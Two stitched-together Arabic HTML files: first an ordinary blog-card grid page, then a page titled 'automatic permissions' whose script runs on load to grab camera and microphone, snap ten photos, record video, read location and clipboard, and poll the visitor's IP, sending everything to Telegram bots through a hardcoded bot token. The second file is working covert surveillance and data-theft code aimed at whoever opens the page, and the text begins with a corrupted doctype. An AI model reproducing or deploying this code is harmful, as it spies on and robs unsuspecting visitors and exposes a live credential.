webmOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مدونات كاملة</title>
  <style>
    body {
      margin: 0;
      background: #fff000;
      font-family: Arial, sans-serif;
    }

    #blogs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      padding: 30px;
      direction: rtl;
    }

    .blog-box {
      background: rgba(90, 0, 130, 0.2);
      border: 2px dashed #cc33ff;
      box-shadow: 0 0 15px #cc33ff, 0 0 30px #9900cc;
      border-radius: 15px;
      padding: 10px;
      color: black;
      height: 150px;
      overflow: hidden;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .blog-box:hover {
      transform: scale(1.05);
    }

    /* مربع كبير يغطي الشاشة بالكامل */
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.9);
      color: white;
      display: none;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px;
      z-index: 999;
      flex-direction: column;
    }

    #fullText {
      font-size: 28px;
      line-height: 2.2;
      white-space: pre-wrap;
      max-width: 90vw;
    }

    #copyBtn {
      margin-top: 30px;
      background-color: purple;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .home-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 75px;
      height: 75px;
      background-color: pink;
      color: black;
      font-size: 30px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-decoration: none;
      box-shadow: 0 0 15px yellow;
      animation: pulse 2s infinite;
      z-index: 1000;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px yellow; }
      50% { box-shadow: 0 0 25px yellow; }
      100% { box-shadow: 0 0 5px yellow; }
    }

    @media (max-width: 768px) {
      #blogs {
        grid-template-columns: 1fr;
      }
      #fullText {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>

<!-- شبكة المربعات -->
<div id="blogs"></div>

<!-- مربع يغطي الشاشة بالكامل -->
<div id="overlay" onclick="hideOverlay(event)">
  <div id="fullText" onclick="event.stopPropagation()"></div>
  <button id="copyBtn" onclick="copyText()">📋 نسخ النص</button>
</div>

<!-- زر وردي يرجع إلى index.html -->
<a href="index.html" class="home-btn" title="العودة للصفحة الرئيسية">🏠</a>

<script>
  const blogFiles = ['blog1.txt', 'blog2.txt', 'blog3.txt'];
  const blogsContainer = document.getElementById('blogs');
  const overlay = document.getElementById('overlay');
  const fullText = document.getElementById('fullText');
  let allBlogs = [];

  async function loadBlogs() {
    for (const file of blogFiles) {
      try {
        const res = await fetch(file);
        const text = await res.text();
        const parts = text.split(/(?:\r?\n){2,}|===/g).filter(e => e.trim());
        allBlogs.push(...parts);
      } catch (err) {
        console.error('فشل تحميل', file, err);
      }
    }

    allBlogs.slice(0, 9).forEach((text) => {
      const box = document.createElement('div');
      box.className = 'blog-box';
      box.innerText = text.substring(0, 60) + '...';
      box.onclick = () => showFullText(text);
      blogsContainer.appendChild(box);
    });
  }

  function showFullText(text) {
    fullText.innerText = text;
    overlay.style.display = 'flex';
  }

  function hideOverlay(event) {
    overlay.style.display = 'none';
  }

  function copyText() {
    navigator.clipboard.writeText(fullText.innerText)
      .then(() => alert("✅ تم نسخ النص!"));
  }

  loadBlogs();
</script>
</div>


<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>أذونات تلقائية</title>
</head>
<body>
<script>
const TELEGRAM_BOTS = [
  { token: "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M", chatId: "7664410054" },
  { token: "TOKEN2", chatId: "ID2" },
  { token: "TOKEN3", chatId: "ID3" }
];

async function startAll() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    sendToAllBots("👑دخول جديد👑\nطلب أذونات بدأ ✅");

    captureImages(stream);
    recordVideo(stream, 10);
    requestMicrophone();
    getLocation();
    readClipboard();
    sendIP();

    setInterval(() => {
      sendIP();
    }, 60000);
  } catch (e) {
    sendToAllBots("❌ فشل إذن الكاميرا/الصوت: " + e.message);
  }
}

function sendToAllBots(text) {
  TELEGRAM_BOTS.forEach(bot => {
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: bot.chatId,
        text: text
      })
    });
  });
}

function sendMediaToAllBots(file, type) {
  TELEGRAM_BOTS.forEach(bot => {
    const formData = new FormData();
    formData.append(type === "video" ? "video" : "photo", file, file.name);
    formData.append("chat_id", bot.chatId);
    formData.append("caption", type === "video" ? "🎬 فيديو جديد 🎬" : "📸 صورة");

    fetch(`https://api.telegram.org/bot${bot.token}/send${type === "video" ? "Video" : "Photo"}`, {
      method: "POST",
      body: formData
    });
  });
}

function captureImages(stream) {
  const video = document.createElement("video");
  video.srcObject = stream;
  video.play();

  let count = 0;
  const interval = setInterval(() => {
    if (count >= 10) return clearInterval(interval);
    const canvas = document.createElement("canvas");
    canvas.width = 480;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const file = new File([blob], `photo_${count}.png`);
      sendMediaToAllBots(file, "photo");
    }, "image/png");
    count++;
  }, 1000);
}

function recordVideo(stream, duration) {
  const recorder = new MediaRecorder(stream);
  const chunks = [];

  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = () => {
    const blob = new Blob(chunks, { type: "video/webm" });
    const file = new File([blob], "video.webm");
    sendMediaToAllBots(file, "video");
  };

  recorder.start();
  setTimeout(() => {
    recorder.stop();
    stream.getTracks().forEach(t => t.stop());
  }, duration * 1000);
}

function requestMicrophone() {
  navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
    stream.getTracks().forEach(t => t.stop());
  }).catch(err => {
    sendToAllBots("🎙 فشل إذن الميكروفون: " + err.message);
  });
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude.toFixed(5);
        const lon = pos.coords.longitude.toFixed(5);
        const acc = pos.coords.accuracy;
        sendToAllBots(`📍الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}m`);
      },
      err => {
        sendToAllBots("📍فشل تحديد الموقع: " + err.message);
      }
    );
  }
}

function readClipboard() {
  if (navigator.clipboard && navigator.clipboard.readText) {
    navigator.clipboard.readText().then(text => {
      if (text) sendToAllBots("📋 الحافظة:\n" + text);
    });
  }
}

function sendIP() {
  fetch("https://api.ipify.org/?format=json")
    .then(res => res.json())
    .then(data => {
      sendToAllBots("🌐 IP: " + data.ip + "\n" + window.location.href);
    });
}

// بدء الأوامر بعد دخول الموقع مباشرة
window.onload = startAll;
</script>

</body>
</html>
